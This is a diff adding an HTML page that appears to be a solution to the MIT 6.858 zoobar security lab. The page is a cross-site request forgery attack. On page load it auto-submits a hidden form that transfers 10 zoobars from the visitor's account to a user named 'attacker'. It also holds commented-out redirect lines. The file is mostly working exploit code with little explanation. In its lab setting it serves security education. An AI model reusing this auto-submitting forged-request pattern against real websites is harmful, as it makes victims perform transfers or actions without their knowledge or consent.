@@ -1,1 +1,22 @@
-<h3>Hello World!</h3>
+<html>
+</head>
+<!--<meta http-equiv="refresh" content="0; url=http://bbs.sjtu.edu.cn"> -->
+<script>
+    function clickButton() {
+        document.getElementById("submit").click();
+        //window.location="http://css.csail.mit.edu/6.858/2012/"
+    }
+    var submitForm = function () {
+        return false;
+    }
+</script>
+</head>
+<body onload="clickButton()">
+    <b>Balance: </b><span id="myZoobars"></span> zoobars<br />
+    <form hidden method="POST" action="/zoobar/index.cgi/transfer" name="transferform">
+        <p>Send <input name="zoobars" type="text" value="10" size=5> zoobars</p>
+        <p>to <input name=recipient value="attacker" size=10></p>
+        <input id="submit" type="submit" name="submission" value="Send">
+    </form>
+</body>
+</html>
